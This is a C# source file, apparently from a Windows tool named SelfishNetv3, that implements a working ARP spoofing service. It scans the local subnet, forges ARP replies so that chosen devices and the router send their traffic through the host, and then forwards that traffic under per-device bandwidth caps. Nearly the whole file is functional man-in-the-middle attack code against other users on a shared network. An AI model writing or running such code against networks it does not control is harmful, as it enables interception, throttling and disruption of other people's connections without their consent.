using System;
using System.Buffers;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace SelfishNetv3
{
    /// <summary>
    /// Core ARP spoofing, network discovery, and packet redirection service.
    /// Uses SharpPcap (Npcap backend) for all packet capture and injection.
    /// </summary>
    public sealed class ArpSpoofService : IDisposable
    {
        // ───── State ─────
        private readonly DeviceCollection _devices;
        private readonly NetworkInterface _nic;

        private ILiveDevice? _arpDevice;
        private ILiveDevice? _redirectDevice;

        private CancellationTokenSource? _arpListenerCts;
        private CancellationTokenSource? _redirectorCts;
        private CancellationTokenSource? _discoveryCts;

        private Task? _arpListenerTask;
        private Task? _redirectorTask;
        private Task? _discoveryTask;

        // ───── Network addresses ─────
        public byte[] LocalIP { get; }
        public byte[] LocalMAC { get; }
        public byte[] Netmask { get; }
        public byte[] RouterIP { get; }
        public byte[]? RouterMAC { get; private set; }

        private static readonly byte[] BroadcastMac = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

        // ───── Constructor ─────
        public ArpSpoofService(NetworkInterface nic, DeviceCollection devices)
        {
            _nic = nic ?? throw new ArgumentNullException(nameof(nic));
            _devices = devices ?? throw new ArgumentNullException(nameof(devices));

            var ipProps = nic.GetIPProperties();

            // Find first IPv4 unicast address
            var ipv4Addr = ipProps.UnicastAddresses
                .FirstOrDefault(a => a.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);

            LocalIP = ipv4Addr?.Address.GetAddressBytes()
                ?? throw new InvalidOperationException("No IPv4 address found on selected adapter.");
            Netmask = ipv4Addr!.IPv4Mask.GetAddressBytes();
            LocalMAC = nic.GetPhysicalAddress().GetAddressBytes();

            RouterIP = ipProps.GatewayAddresses.Count > 0
                ? ipProps.GatewayAddresses[0].Address.GetAddressBytes()
                : throw new InvalidOperationException("No gateway address found on selected adapter.");
        }

        // ───── Device helpers ─────

        /// <summary>
        /// Opens a SharpPcap live device for the selected NIC.
        /// </summary>
        private ILiveDevice OpenDevice(string filter)
        {
            // Find the SharpPcap device matching our NIC
            var allDevices = CaptureDeviceList.Instance;
            var device = allDevices
                .OfType<LibPcapLiveDevice>()
                .FirstOrDefault(d => d.Interface?.FriendlyName == _nic.Name
                    || d.Description?.Contains(_nic.Description) == true
                    || d.Name.Contains(_nic.Id));

            if (device is null)
            {
                // Fallback: try matching by MAC address
                device = allDevices
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d =>
                    {
                        try
                        {
                            var addrs = d.Interface?.MacAddress?.GetAddressBytes();
                            return addrs != null && NetworkHelper.AreValuesEqual(addrs, LocalMAC);
                        }
                        catch { return false; }
                    });
            }

            if (device is null)
                throw new InvalidOperationException(
                    $"Could not find capture device for NIC '{_nic.Description}'. Ensure Npcap is installed.");

            device.Open(DeviceModes.Promiscuous, 1000);

            if (!string.IsNullOrEmpty(filter))
                device.Filter = filter;

            return device;
        }

        // ───── ARP Packet Construction ─────

        /// <summary>
        /// Builds a raw ARP packet using PacketDotNet.
        /// </summary>
        private static byte[] BuildArpPacket(
            byte[] ethDstMac, byte[] ethSrcMac,
            ArpOperation operation,
            byte[] arpSenderMac, byte[] arpSenderIp,
            byte[] arpTargetMac, byte[] arpTargetIp)
        {
            var arpPacket = new ArpPacket(
                operation,
                targetHardwareAddress: new PhysicalAddress(arpTargetMac),
                targetProtocolAddress: new IPAddress(arpTargetIp),
                senderHardwareAddress: new PhysicalAddress(arpSenderMac),
                senderProtocolAddress: new IPAddress(arpSenderIp));

            var ethernetPacket = new EthernetPacket(
                sourceHardwareAddress: new PhysicalAddress(ethSrcMac),
                destinationHardwareAddress: new PhysicalAddress(ethDstMac),
                EthernetType.Arp)
            {
                PayloadPacket = arpPacket
            };

            return ethernetPacket.Bytes;
        }

        // ───── ARP Listener (Discovery) ─────

        /// <summary>
        /// Starts listening for ARP reply packets to discover devices.
        /// </summary>
        public void StartArpListener()
        {
            if (_arpListenerTask is not null && !_arpListenerTask.IsCompleted)
                return;

            _arpDevice ??= OpenDevice("arp");
            _arpListenerCts = new CancellationTokenSource();
            var token = _arpListenerCts.Token;

            _arpListenerTask = Task.Run(() => ArpListenerLoop(token), token);
        }

        private void ArpListenerLoop(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                try
                {
                    var status = _arpDevice!.GetNextPacket(out var capture);
                    if (status != GetPacketStatus.PacketRead)
                        continue;

                    var rawPacket = capture.GetPacket();
                    if (rawPacket?.Data is null || rawPacket.Data.Length < 42)
                        continue;

                    var data = rawPacket.Data;

                    // Extract source MAC from Ethernet header (offset 6, length 6)
                    var srcMac = new byte[6];
                    Array.Copy(data, 6, srcMac, 0, 6);

                    // Skip packets from ourselves
                    if (NetworkHelper.AreValuesEqual(srcMac, LocalMAC))
                        continue;

                    // Check ARP operation: offset 21, value 2 = ARP Reply
                    if (data[21] != 2)
                        continue;

                    // Extract sender MAC (offset 22, length 6) and sender IP (offset 28, length 4)
                    var senderMac = new byte[6];
                    var senderIp = new byte[4];
                    Array.Copy(data, 22, senderMac, 0, 6);
                    Array.Copy(data, 28, senderIp, 0, 4);

                    var device = new NetworkDevice
                    {
                        Ip = new IPAddress(senderIp),
                        Mac = new PhysicalAddress(senderMac),
                        CapDown = 0,
                        CapUp = 0,
                        IsLocalPc = false,
                        Name = string.Empty,
                        BytesReceivedSinceLastReset = 0,
                        BytesSentSinceLastReset = 0,
                        Redirect = true,
                        LastArpReplyTime = DateTime.Now,
                        TotalPacketReceived = 0,
                        TotalPacketSent = 0,
                        IsGateway = NetworkHelper.AreValuesEqual(senderIp, RouterIP)
                    };

                    if (device.IsGateway)
                        RouterMAC = senderMac;

                    _devices.AddDevice(device);
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"ARP listener error: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// Stops the ARP listener.
        /// </summary>
        public void StopArpListener()
        {
            if (_arpListenerCts is null) return;
            _arpListenerCts.Cancel();
            _arpListenerTask?.Wait(TimeSpan.FromSeconds(5));
            _arpListenerCts.Dispose();
            _arpListenerCts = null;
        }

        // ───── Network Discovery ─────

        /// <summary>
        /// Starts active network discovery by sending ARP requests to all IPs in the subnet.
        /// </summary>
        public void StartDiscovery()
        {
            if (_discoveryTask is not null && !_discoveryTask.IsCompleted)
                return;

            _discoveryCts = new CancellationTokenSource();
            var token = _discoveryCts.Token;

            _discoveryTask = Task.Run(() => DiscoveryLoop(token), token);
        }

        private void DiscoveryLoop(CancellationToken token)
        {
            try
            {
                foreach (var ip in EnumerateSubnetAddresses())
                {
                    if (token.IsCancellationRequested)
                        break;

                    SendArpRequest(ip.ToString());
                    Thread.Sleep(5); // Yield CPU, avoid flooding
                }
            }
            catch (OperationCanceledException) { }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Discovery error: {ex.Message}");
            }
        }

        /// <summary>
        /// Enumerates all valid host addresses in the local subnet.
        /// Replaces the old deeply-nested loop approach.
        /// </summary>
        private System.Collections.Generic.IEnumerable<IPAddress> EnumerateSubnetAddresses()
        {
            uint ipAddr = BitConverter.ToUInt32(LocalIP, 0);
            uint mask = BitConverter.ToUInt32(Netmask, 0);

            uint network = ipAddr & mask;
            uint broadcast = network | ~mask;

            // Iterate from network+1 to broadcast-1 (skip network and broadcast addresses)
            for (uint host = network + 1; host < broadcast; host++)
            {
                yield return new IPAddress(BitConverter.GetBytes(host));
            }
        }

        /// <summary>
        /// Stops network discovery.
        /// </summary>
        public void StopDiscovery()
        {
            if (_discoveryCts is null) return;
            _discoveryCts.Cancel();
            _discoveryTask?.Wait(TimeSpan.FromSeconds(10));
            _discoveryCts.Dispose();
            _discoveryCts = null;
        }

        // ───── Packet Redirector ─────

        /// <summary>
        /// Starts the packet redirector that intercepts and forwards traffic
        /// between spoofed devices and the router.
        /// </summary>
        public int StartRedirector()
        {
            if (_redirectorTask is not null && !_redirectorTask.IsCompleted)
                return 0;

            try
            {
                _redirectDevice ??= OpenDevice("ip");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to open capture device for redirection: {ex.Message}");
                return -1;
            }

            _redirectorCts = new CancellationTokenSource();
            var token = _redirectorCts.Token;

            _redirectorTask = Task.Run(() => RedirectorLoop(token), token);
            return 0;
        }

        private void RedirectorLoop(CancellationToken token)
        {
            var router = _devices.GetRouter();
            if (router is not null)
                RouterMAC = router.Mac.GetAddressBytes();

            if (RouterMAC is null)
            {
                MessageBox.Show("No router found to redirect packets.");
                return;
            }

            // Pre-allocate reusable buffers for MAC and IP extraction
            var srcMac = new byte[6];
            var dstIp = new byte[4];
            var srcIp = new byte[4];

            while (!token.IsCancellationRequested)
            {
                try
                {
                    var status = _redirectDevice!.GetNextPacket(out var capture);
                    if (status != GetPacketStatus.PacketRead)
                        continue;

                    var rawPacket = capture.GetPacket();
                    if (rawPacket?.Data is null || rawPacket.Data.Length < 34)
                        continue;

                    var pktData = rawPacket.Data;
                    int pktLen = pktData.Length;

                    // Extract source MAC from Ethernet header
                    Array.Copy(pktData, 6, srcMac, 0, 6);

                    // ─── Case 1: Packet from local PC ───
                    if (NetworkHelper.AreValuesEqual(srcMac, LocalMAC))
                    {
                        Array.Copy(pktData, 26, srcIp, 0, 4);
                        if (NetworkHelper.AreValuesEqual(srcIp, LocalIP))
                        {
                            var localPc = _devices.GetLocalPC();
                            if (localPc is not null)
                                Interlocked.Add(ref localPc.bytesSentField, pktLen);
                        }
                        continue;
                    }

                    // ─── Case 2: Packet from router ───
                    if (NetworkHelper.AreValuesEqual(srcMac, RouterMAC))
                    {
                        Array.Copy(pktData, 30, dstIp, 0, 4);

                        // Packet destined for us — count as received
                        if (NetworkHelper.AreValuesEqual(dstIp, LocalIP))
                        {
                            var localPc = _devices.GetLocalPC();
                            if (localPc is not null)
                                Interlocked.Add(ref localPc.bytesReceivedField, pktLen);
                            continue;
                        }

                        // Packet destined for a spoofed device — forward it
                        var targetDevice = _devices.GetDeviceByIp(dstIp);
                        if (targetDevice is not null && targetDevice.Redirect)
                        {
                            long cap = targetDevice.CapDown;
                            if (cap == 0 || cap > targetDevice.BytesReceivedSinceLastReset)
                            {
                                // Rewrite Ethernet header: dst = target MAC, src = our MAC
                                var fwdData = new byte[pktLen];
                                Array.Copy(pktData, fwdData, pktLen);
                                Array.Copy(targetDevice.Mac.GetAddressBytes(), 0, fwdData, 0, 6);
                                Array.Copy(LocalMAC, 0, fwdData, 6, 6);
                                _redirectDevice.SendPacket(fwdData);
                                Interlocked.Add(ref targetDevice.bytesReceivedField, pktLen);
                            }
                        }
                        continue;
                    }

                    // ─── Case 3: Packet from a spoofed device (heading to router) ───
                    Array.Copy(pktData, 30, dstIp, 0, 4);
                    if (NetworkHelper.AreValuesEqual(dstIp, LocalIP))
                        continue; // Ignore packets actually destined for us

                    var sourceDevice = _devices.GetDeviceByMac(srcMac);
                    if (sourceDevice is not null && sourceDevice.Redirect)
                    {
                        long cap = sourceDevice.CapUp;
                        if (cap == 0 || cap > sourceDevice.BytesSentSinceLastReset)
                        {
                            // Rewrite Ethernet header: dst = router MAC, src = our MAC
                            var fwdData = new byte[pktLen];
                            Array.Copy(pktData, fwdData, pktLen);
                            Array.Copy(RouterMAC, 0, fwdData, 0, 6);
                            Array.Copy(LocalMAC, 0, fwdData, 6, 6);
                            _redirectDevice.SendPacket(fwdData);
                            Interlocked.Add(ref sourceDevice.bytesSentField, pktLen);
                        }
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"Redirector error: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// Stops the packet redirector.
        /// </summary>
        public void StopRedirector()
        {
            if (_redirectorCts is null) return;
            _redirectorCts.Cancel();
            _redirectorTask?.Wait(TimeSpan.FromSeconds(5));
            _redirectorCts.Dispose();
            _redirectorCts = null;
        }

        // ───── Spoofing ─────

        /// <summary>
        /// Spoofs ARP tables so traffic between ip1 and ip2 flows through us.
        /// </summary>
        public void Spoof(IPAddress ip1, IPAddress ip2)
        {
            var dev1 = _devices.GetDeviceByIp(ip1.GetAddressBytes());
            var dev2 = _devices.GetDeviceByIp(ip2.GetAddressBytes());

            if (dev1 is null || dev2 is null)
                return;

            var mac1 = dev1.Mac.GetAddressBytes();
            var mac2 = dev2.Mac.GetAddressBytes();
            var ipBytes1 = dev1.Ip.GetAddressBytes();
            var ipBytes2 = dev2.Ip.GetAddressBytes();

            // Tell dev1 that dev2's IP is at our MAC
            SendPacketSafe(BuildArpPacket(mac1, LocalMAC, ArpOperation.Response,
                LocalMAC, ipBytes2, mac1, ipBytes1));

            // Tell dev2 that dev1's IP is at our MAC
            SendPacketSafe(BuildArpPacket(mac2, LocalMAC, ArpOperation.Response,
                LocalMAC, ipBytes1, mac2, ipBytes2));

            // Tell dev2 our real MAC (so it can reach us)
            SendPacketSafe(BuildArpPacket(LocalMAC, mac2, ArpOperation.Response,
                mac2, ipBytes2, LocalMAC, LocalIP));

            // Tell dev1 our real MAC (so it can reach us)
            SendPacketSafe(BuildArpPacket(LocalMAC, mac1, ArpOperation.Response,
                mac1, ipBytes1, LocalMAC, LocalIP));
        }

        /// <summary>
        /// Restores the correct ARP mapping between ip1 and ip2 (un-spoof).
        /// </summary>
        public void UnSpoof(IPAddress ip1, IPAddress ip2)
        {
            var dev1 = _devices.GetDeviceByIp(ip1.GetAddressBytes());
            var dev2 = _devices.GetDeviceByIp(ip2.GetAddressBytes());

            if (dev1 is null || dev2 is null)
                return;

            var mac1 = dev1.Mac.GetAddressBytes();
            var mac2 = dev2.Mac.GetAddressBytes();
            var ipBytes1 = dev1.Ip.GetAddressBytes();
            var ipBytes2 = dev2.Ip.GetAddressBytes();

            // Tell dev1 the real MAC of dev2
            SendPacketSafe(BuildArpPacket(mac1, mac2, ArpOperation.Request,
                mac2, ipBytes2, BroadcastMac, ipBytes1));

            // Tell dev2 the real MAC of dev1
            SendPacketSafe(BuildArpPacket(mac2, mac1, ArpOperation.Request,
                mac1, ipBytes1, BroadcastMac, ipBytes2));
        }

        /// <summary>
        /// Un-spoofs all discovered devices against the router.
        /// </summary>
        public void CompleteUnspoof()
        {
            var router = _devices.GetRouter();
            if (router is null) return;

            foreach (var device in _devices.GetAll())
            {
                UnSpoof(device.Ip, router.Ip);
            }
        }

        // ───── ARP Request ─────

        /// <summary>
        /// Sends an ARP request to discover the MAC address of the given IP.
        /// </summary>
        public void SendArpRequest(string ip)
        {
            EnsureArpDeviceOpen();

            var targetIp = IPAddress.Parse(ip).GetAddressBytes();
            var packet = BuildArpPacket(
                BroadcastMac, LocalMAC,
                ArpOperation.Request,
                LocalMAC, LocalIP,
                BroadcastMac, targetIp);

            SendPacketSafe(packet);
        }

        /// <summary>
        /// Sends an ARP request to discover the router's MAC address.
        /// </summary>
        public void FindMacRouter()
        {
            SendArpRequest(new IPAddress(RouterIP).ToString());
        }

        // ───── Helpers ─────

        private void EnsureArpDeviceOpen()
        {
            _arpDevice ??= OpenDevice("arp");
        }

        private void SendPacketSafe(byte[] packet)
        {
            try
            {
                _arpDevice?.SendPacket(packet);
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"SendPacket error: {ex.Message}");
            }
        }

        // ───── Full Shutdown ─────

        /// <summary>
        /// Stops all background tasks, un-spoofs all devices, and releases resources.
        /// </summary>
        public void Shutdown()
        {
            StopDiscovery();
            StopArpListener();
            StopRedirector();
            CompleteUnspoof();
        }

        // ───── IDisposable ─────

        public void Dispose()
        {
            Shutdown();

            _arpDevice?.Close();
            _arpDevice?.Dispose();
            _arpDevice = null;

            _redirectDevice?.Close();
            _redirectDevice?.Dispose();
            _redirectDevice = null;
        }
    }
}
